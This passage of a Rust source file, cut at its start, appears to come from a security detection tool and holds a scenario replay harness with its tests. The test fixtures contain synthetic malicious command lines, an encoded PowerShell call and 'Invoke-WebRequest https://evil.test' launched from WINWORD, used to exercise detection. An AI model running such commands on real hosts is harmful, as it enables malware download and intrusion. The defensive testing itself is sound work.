            format!("{name} exceeded configured replay threshold")
        },
    }
}

fn run_id_for_manifest(manifest: &ReplayScenarioManifest) -> String {
    format!("replay_run:{}:{}", manifest.name, manifest.seed_time_ms)
}

fn load_scenario_manifest(
    path: impl AsRef<Path>,
) -> Result<LoadedReplayScenario, ReplayHarnessError> {
    let path = path.as_ref().to_path_buf();
    let raw = fs::read_to_string(&path).map_err(|source| ReplayHarnessError::ScenarioRead {
        path: path.clone(),
        source,
    })?;
    let manifest = serde_yaml::from_str::<ReplayScenarioManifest>(&raw).map_err(|source| {
        ReplayHarnessError::ScenarioParse {
            path: path.clone(),
            source,
        }
    })?;
    validate_manifest(&path, &manifest)?;
    Ok(LoadedReplayScenario { path, manifest })
}

fn validate_manifest(
    path: &Path,
    manifest: &ReplayScenarioManifest,
) -> Result<(), ReplayHarnessError> {
    if manifest.name.trim().is_empty() {
        return Err(ReplayHarnessError::ScenarioValidation {
            path: path.to_path_buf(),
            reason: "scenario name must not be empty".to_string(),
        });
    }
    if manifest.description.trim().is_empty() {
        return Err(ReplayHarnessError::ScenarioValidation {
            path: path.to_path_buf(),
            reason: "scenario description must not be empty".to_string(),
        });
    }
    if manifest.seed_time_ms <= 0 {
        return Err(ReplayHarnessError::ScenarioValidation {
            path: path.to_path_buf(),
            reason: "seed_time_ms must be greater than zero".to_string(),
        });
    }
    if manifest.requested_by.trim().is_empty() {
        return Err(ReplayHarnessError::ScenarioValidation {
            path: path.to_path_buf(),
            reason: "requested_by must not be empty".to_string(),
        });
    }
    match &manifest.input {
        ReplayScenarioInput::Events { events } if events.is_empty() => {
            return Err(ReplayHarnessError::ScenarioValidation {
                path: path.to_path_buf(),
                reason: "event-backed scenarios must include at least one event".to_string(),
            });
        }
        ReplayScenarioInput::ReplayBundles { paths } if paths.is_empty() => {
            return Err(ReplayHarnessError::ScenarioValidation {
                path: path.to_path_buf(),
                reason: "bundle-backed scenarios must include at least one path".to_string(),
            });
        }
        ReplayScenarioInput::Events { .. } | ReplayScenarioInput::ReplayBundles { .. } => {}
    }
    Ok(())
}

fn resolve_relative_path(manifest_path: &Path, referenced: &str) -> PathBuf {
    let candidate = PathBuf::from(referenced);
    if candidate.is_absolute() {
        candidate
    } else {
        manifest_path
            .parent()
            .unwrap_or_else(|| Path::new("."))
            .join(candidate)
    }
}

fn scenario_paths_in_dir(scenarios_dir: &Path) -> Result<Vec<PathBuf>, ReplayHarnessError> {
    let entries =
        fs::read_dir(scenarios_dir).map_err(|source| ReplayHarnessError::ScenarioRead {
            path: scenarios_dir.to_path_buf(),
            source,
        })?;
    let mut paths = entries
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .filter(|path| path.extension().and_then(|ext| ext.to_str()) == Some("yaml"))
        .collect::<Vec<_>>();
    paths.sort();
    Ok(paths)
}

fn normalize_groups(groups: &[Vec<String>]) -> Vec<Vec<String>> {
    let mut normalized = groups
        .iter()
        .map(|group| {
            let mut sorted = group.clone();
            sorted.sort();
            sorted.dedup();
            sorted
        })
        .collect::<Vec<_>>();
    normalized.sort();
    normalized
}

fn offline_correlation_config(config: &SwarmConfig) -> CorrelationConfig {
    let mut correlation = config.correlation.clone();
    correlation.enabled = true;
    if correlation.time_window_ms <= 0 {
        correlation.time_window_ms = 300_000;
    }
    if correlation.min_shared_keys == 0 {
        correlation.min_shared_keys = 1;
    }
    if correlation.candidate_limit == 0 {
        correlation.candidate_limit = 32;
    }
    correlation
}

fn sanitize_id(id: &str) -> String {
    id.chars()
        .map(|ch| {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                ch
            } else {
                '_'
            }
        })
        .collect()
}

fn sorted_recent_runs(bundles: &[ReplayRunBundle]) -> Vec<ReplayRunBundle> {
    let mut ordered = bundles.to_vec();
    ordered.sort_by_key(|bundle| std::cmp::Reverse(bundle.created_at_ms));
    ordered
}

#[derive(Debug, Clone)]
struct LoadedReplayScenario {
    path: PathBuf,
    manifest: ReplayScenarioManifest,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct ReplayRunIndex {
    entries: Vec<ReplayRunRecord>,
}

#[cfg(test)]
mod tests {
    use super::{
        DefaultReplayHarness, ReplayEvaluationReport, ReplayRunBundle, ReplayScenarioInput,
        ReplayScenarioManifest, ReplayScenarioStep, render_evaluation_report, render_replay_run,
        render_suite_report,
    };
    use crate::config::parse_config;
    use serde_json::Value;
    use std::fs;
    use std::path::{Path, PathBuf};
    use std::time::{SystemTime, UNIX_EPOCH};
    use swarm_core::types::{ResponseAction, Severity};
    use swarm_whisker::{ProcessStartEvent, TelemetryEvent, TelemetryPayload};

    fn sample_config() -> swarm_core::config::SwarmConfig {
        parse_config(
            r#"
name: replay-tests
description: replay test config
runtime:
  mode: live_response
  telemetry_sources:
    - name: synthetic-process
      subject: telemetry.synthetic.process
  max_in_flight_actions: 4
  require_durable_live_response: false
detection:
  strategy: suspicious_process_tree
  high_confidence_threshold: 0.90
  medium_confidence_threshold: 0.70
pheromone:
  default_half_life_secs: 3600.0
  evaporation_threshold: 0.01
  min_sources_for_escalation: 2
  alert_threshold: 2.0
  incident_threshold: 5.0
  backend:
    kind: in_memory
policy:
  human_gate_severity: HIGH
  lease_ttl_ms: 60000
audit:
  bundle_store:
    kind: memory
  recent_decisions_limit: 20
investigation:
  enabled: false
  worker_count: 1
  max_pending_jobs: 16
  time_budget_ms: 250
  bundle_store:
    kind: memory
correlation:
  enabled: false
  time_window_ms: 300000
  min_shared_keys: 1
  candidate_limit: 32
  incident_store:
    kind: memory
"#,
            "inline",
        )
        .unwrap()
    }

    fn suspicious_event(
        event_id: &str,
        host_id: &str,
        user: &str,
        command_line: &str,
    ) -> TelemetryEvent {
        TelemetryEvent {
            source: "synthetic".to_string(),
            event_id: event_id.to_string(),
            timestamp: 1_700_000_000_000,
            host_id: Some(host_id.to_string()),
            payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                parent_process: "WINWORD".to_string(),
                process_name: "powershell".to_string(),
                command_line: command_line.to_string(),
                user: Some(user.to_string()),
            }),
        }
    }

    fn benign_event(event_id: &str) -> TelemetryEvent {
        TelemetryEvent {
            source: "synthetic".to_string(),
            event_id: event_id.to_string(),
            timestamp: 1_700_000_000_000,
            host_id: Some("host-benign".to_string()),
            payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                parent_process: "launchd".to_string(),
                process_name: "ls".to_string(),
                command_line: "ls -la".to_string(),
                user: Some("alice".to_string()),
            }),
        }
    }

    fn scenario_manifest() -> ReplayScenarioManifest {
        ReplayScenarioManifest {
            name: "office_dropper_correlation".to_string(),
            description: "Two suspicious office child processes should correlate".to_string(),
            seed_time_ms: 1_700_000_100_000,
            requested_by: "replay-whisker".to_string(),
            receipt_chain: vec!["seed-receipt".to_string()],
            input: ReplayScenarioInput::Events {
                events: vec![
                    ReplayScenarioStep {
                        action: ResponseAction::IsolateHost {
                            host_id: "host-ops-1".to_string(),
                        },
                        event: suspicious_event(
                            "hunt-evt-1",
                            "host-ops-1",
                            "alice",
                            "powershell.exe -enc AAA=",
                        ),
                    },
                    ReplayScenarioStep {
                        action: ResponseAction::BlockEgress {
                            target: "198.51.100.20".to_string(),
                        },
                        event: suspicious_event(
                            "hunt-evt-2",
                            "host-ops-1",
                            "alice",
                            "powershell.exe Invoke-WebRequest https://evil.test",
                        ),
                    },
                ],
            },
            expectations: serde_yaml::from_str(
                r#"
replay_bundle_count: 2
investigation_count: 2
incident_count: 1
hunts:
  - hunt_id: hunt-evt-1
    action_kind: isolate_host
    policy_verdict: require_human
    response_kind: success
  - hunt_id: hunt-evt-2
    action_kind: block_egress
    policy_verdict: require_human
    response_kind: success
incident_hunt_groups:
  - [hunt-evt-1, hunt-evt-2]
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
            )
            .unwrap(),
        }
    }

    fn benign_manifest() -> ReplayScenarioManifest {
        ReplayScenarioManifest {
            name: "benign_baseline".to_string(),
            description: "Benign process tree should not emit replay bundles".to_string(),
            seed_time_ms: 1_700_000_200_000,
            requested_by: "replay-whisker".to_string(),
            receipt_chain: vec![],
            input: ReplayScenarioInput::Events {
                events: vec![ReplayScenarioStep {
                    action: ResponseAction::Escalate {
                        summary: "operator review".to_string(),
                        urgency: Severity::Medium,
                    },
                    event: benign_event("hunt-benign-1"),
                }],
            },
            expectations: serde_yaml::from_str(
                r#"
replay_bundle_count: 0
investigation_count: 0
incident_count: 0
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
            )
            .unwrap(),
        }
    }

    fn unique_temp_dir(label: &str) -> PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let path = std::env::temp_dir().join(format!(
            "swarm-runtime-replay-{label}-{}-{nanos}",
            std::process::id()
        ));
        fs::create_dir_all(&path).unwrap();
        path
    }

    fn write_scenario(root: &Path, name: &str, manifest: &ReplayScenarioManifest) -> PathBuf {
        let path = root.join(name);
        fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
        path
    }

    fn replay_without_performance(bundle: &ReplayRunBundle) -> Value {
        serde_json::json!({
            "run_id": bundle.run_id,
            "scenario_name": bundle.scenario_name,
            "scenario_path": bundle.scenario_path,
            "input_kind": bundle.input_kind,
            "seed_time_ms": bundle.seed_time_ms,
            "created_at_ms": bundle.created_at_ms,
            "requested_by": bundle.requested_by,
            "expectations": bundle.expectations,
            "replay_bundles": bundle.replay_bundles,
            "investigations": bundle.investigations,
            "incidents": bundle.incidents,
            "deterministic_summary": bundle.deterministic_summary,
        })
    }

    #[tokio::test]
    async fn event_scenario_runs_deterministically_and_persists_result_bundle() {
        let root = unique_temp_dir("events");
        let results_dir = root.join("results");
        let scenario_path = write_scenario(&root, "office-dropper.yaml", &scenario_manifest());
        let harness =
            DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

        let first = harness.run_scenario_path(&scenario_path).await.unwrap();
        let second = harness.run_scenario_path(&scenario_path).await.unwrap();
        let loaded = harness
            .load_run("replay_run:office_dropper_correlation:1700000100000")
            .unwrap()
            .unwrap();

        assert_eq!(first.record.run_id, second.record.run_id);
        assert_eq!(
            replay_without_performance(&first.bundle),
            replay_without_performance(&second.bundle)
        );
        assert_eq!(loaded.record.run_id, first.record.run_id);
        assert_eq!(first.bundle.deterministic_summary.replay_bundle_count, 2);
        assert_eq!(first.bundle.deterministic_summary.investigation_count, 2);
        assert_eq!(first.bundle.deterministic_summary.incident_count, 1);
        assert!(render_replay_run(&first.bundle).contains("office_dropper_correlation"));

        let _ = fs::remove_dir_all(root);
    }

    #[tokio::test]
    async fn replay_bundle_fixtures_can_drive_offline_replay() {
        let root = unique_temp_dir("bundle-fixtures");
        let results_dir = root.join("results");
        let harness =
            DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

        let source_scenario_path = write_scenario(&root, "source.yaml", &scenario_manifest());
        let source_run = harness
            .run_scenario_path(&source_scenario_path)
            .await
            .unwrap();
        let fixture_path = root.join("fixture-bundle.json");
        fs::write(
            &fixture_path,
            serde_json::to_string_pretty(&source_run.bundle.replay_bundles[0]).unwrap(),
        )
        .unwrap();

        let bundle_manifest = serde_yaml::from_str::<ReplayScenarioManifest>(&format!(
            r#"
name: persisted_bundle_fixture
description: Persisted replay bundles can be re-run offline
seed_time_ms: 1700000300000
requested_by: replay-whisker
input:
  kind: replay_bundles
  paths:
    - {}
expectations:
  replay_bundle_count: 1
  investigation_count: 1
  incident_count: 1
  hunts:
    - hunt_id: hunt-evt-1
      action_kind: isolate_host
      policy_verdict: require_human
      response_kind: success
  incident_hunt_groups:
    - [hunt-evt-1]
"#,
            fixture_path.display()
        ))
        .unwrap();
        let bundle_scenario_path = write_scenario(&root, "bundle-source.yaml", &bundle_manifest);

        let replay_from_bundle = harness
            .run_scenario_path(&bundle_scenario_path)
            .await
            .unwrap();
        assert_eq!(
            replay_from_bundle
                .bundle
                .deterministic_summary
                .replay_bundle_count,
            1
        );
        assert_eq!(
            replay_from_bundle
                .bundle
                .deterministic_summary
                .investigation_count,
            1
        );
        assert_eq!(
            replay_from_bundle
                .bundle
                .deterministic_summary
                .incident_count,
            1
        );

        let _ = fs::remove_dir_all(root);
    }

    #[tokio::test]
    async fn evaluation_report_passes_expected_scenario_and_flags_regressions() {
        let root = unique_temp_dir("evaluation");
        let results_dir = root.join("results");
        let harness =
            DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

        let passing_path = write_scenario(&root, "passing.yaml", &scenario_manifest());
        let passing_report = harness.evaluate_scenario_path(&passing_path).await.unwrap();
        assert!(passing_report.passed);
        assert!(render_evaluation_report(&passing_report).contains("Status: pass"));

        let failing_path = write_scenario(&root, "failing.yaml", &benign_manifest());
        let failing_report: ReplayEvaluationReport =
            harness.evaluate_scenario_path(&failing_path).await.unwrap();
        assert!(failing_report.passed);

        let mut mismatched = scenario_manifest();
        mismatched.expectations.max_detect_latency_us = Some(0);
        let mismatched_path = write_scenario(&root, "mismatched.yaml", &mismatched);
        let regression_report = harness
            .evaluate_scenario_path(&mismatched_path)
            .await
            .unwrap();
        assert!(!regression_report.passed);
        assert!(
            regression_report
                .checks
                .iter()
                .any(|check| check.name == "max_detect_latency_us" && !check.passed)
        );

        let _ = fs::remove_dir_all(root);
    }

    #[tokio::test]
    async fn tracked_repo_scenarios_pass_expectation_gates() {
        let results_dir = unique_temp_dir("repo-scenarios");
        let config_path =
            PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../rulesets/default.yaml");
        let scenarios_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../scenarios");
        let harness = DefaultReplayHarness::from_path(&config_path, &results_dir).unwrap();

        let suite = harness
            .evaluate_scenarios_dir(&scenarios_dir)
            .await
            .unwrap();

        assert!(suite.passed);
        assert!(suite.total_scenarios >= 2);
        assert!(render_suite_report(&suite).contains("Replay Suite"));

        let _ = fs::remove_dir_all(results_dir);
    }
}
